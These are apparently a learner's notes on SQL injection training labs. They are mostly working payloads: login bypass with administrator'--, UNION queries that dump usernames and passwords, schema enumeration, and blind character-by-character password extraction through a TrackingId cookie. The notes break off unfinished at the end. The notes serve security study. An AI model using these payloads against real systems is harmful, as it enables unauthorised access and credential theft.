How to detect SQL:-

 -> Submit single quote character ' and look for errors or other anomalies. 
 -> Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses. 

e.g: https://insecure-website.com/products?category=Gifts
changes made: https://insecure-website.com/products?category=Gifts'--

NOTE: -- is a comment in SQL, so anything after it is ignored by the database.

#1 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:-
  
    1. modify the category parameter
    2. then add '+OR+1=1-- at the end of the category parameter
    3. then solved

     LOGIC USED:- Always check for '-- or ' at end of parameter and check behavior
-----------------------------------------------------------------------------------------


If we have only username and want to find password then we can use union attack

query:- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
        here ' after administrator is closed so rest of the query is ignored


#2 Lab:SQL injection vulnerability allowing login bypass

    1. username= administrator'--&password=anything
    2. then solved

-----------------------------------------------------------------------------------------

#3 Lab:SQL injection UNION attack, determining the number of columns returned by the query 

   1. click on category parameter
   2. then add '+UNION+SELECT+NULL,NULL,NULL-- at the end of the category parameter until it gives column

------------------------------------------------------------------------------------------

IMP:-Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

-------------------------------------------------------------------------------------------------

#4 Lab:SQL injection UNION attack, finding a column containing text

    1.check how many columns we have by adding ' ORDER BY 1--
    2.'UNION SELECT NULL,NULL,NULL--      cus we found 3 columns

LOGIC USED:- First find number of columns then find which column contains text data by putting 'a'/whatever u have to find in each column one by one

--------------------------------------------------------------------------------------------------

TIP to find password:- ' UNION SELECT username, password FROM users--

#5 Lab: SQL injection UNION attack, retrieving interesting data from other tables

    1.url/filter?category=Lifestyle'UNION+SELECT+NULL,NULL--
    2.url/filter?category=Lifestyle'UNION+SELECT+username,password+FROM+users--
    3.then solved

------------------------------------------------------------------------------------------

Theory:- If we have to extract multiple values from a single column we can use concatenation function of that particular database.
        SELECT CONCAT(username, '~', email) AS user_info FROM users;

#6 Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
    1.'+UNION+SELECT+NULL,'abc'--   (abc is used here cus it insures that the column is string )
    2.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

LOGIC USED:- use concatenation function of that particular database to extract multiple values from a single column

------------------------------------------------------------------------------------------

To check sql version:- ' UNION SELECT @@version--

#7 Lab:SQL injection attack, querying the database type and version on MySQL and Microsoft

    1.'+UNION+SELECT+NULL,NULL--+  (used to check no of columns)
    2.'+UNION+SELECT+NULL,@@version--+
    3.then solved

LOGIC USED:- use @@version to check database version and dont forget to check no of columns first

------------------------------------------------------------------------------------------

-----THEORY:- Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database:
           SELECT * FROM information_schema.tables

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
          SELECT * FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

This output shows the columns in the specified table and the data type of each column.

------------------------------------------------------------------------------------------

#8 Lab:SQL injection attack, listing the database contents on non-Oracle databases

    1.'+UNION+SELECT+NULL,NULL--+  (used to check no of columns)
    2.'+UNION+SELECT+table_name, NULL+FROM+information_schema.tables--+  (to find list of tables)
    3.'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_uhvouq'-- (to find columns in users_uhvouq table)
    got columns like email,password,username
    4.'+UNION+SELECT+username_table,+password_table+FROM+users_uhvouq--  (to get list of username and password)

LOGIC USED:- use information_schema.tables to find tables and information_schema.columns to find columns in that particular table

------------------------------------------------------------------------------------------

Theory:- xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Next, we send the following input:
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

xyz is tracking id

#9 Lab:Blind SQL injection with conditional responses

    1.Open burp and capture request
    2.Look for trackingid cookie and send to repeater
    3.modify the trackingid value to Trackingid=xyz' and 1=1--  (gives normal response)
    4.modify the trackingid value to Trackingid=xyz' and 1=2--  (gives different response)
    5.TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a    (verify that there is a table called users)
    6.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a  (verify that there is a user called administrator)
    7.trackingid=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a (gives welcome back means password >3)
    8.TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a (extract single char from passwd)
    9. now add payload on $a$ and keep limit from a-z and 0-9 and special char one by one to find each char of password
    10.' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'-- (use attack type bruteforcer and keep length 1)
        using this we got the first character of password 
    11. now use payload ' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='§a§'-- to get the full string
    12.then solved

----------------------------------------------------------------------------------------------

Theory:-  Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database.

#10 Lab: SQL injection attack, listing the database contents on Oracle

    1. Open any category parameter and use this payload '+UNION+SELECT+'abc','def'+FROM+dual--
    2. Then '+UNION+SELECT+table_name,NULL+FROM+all_tables--
    3. '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
    4. '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

#10 Lab:Blind SQL injection with conditional errors

    1.trackingid=xyz' (see response for internal error)
    2.

gfg
.......
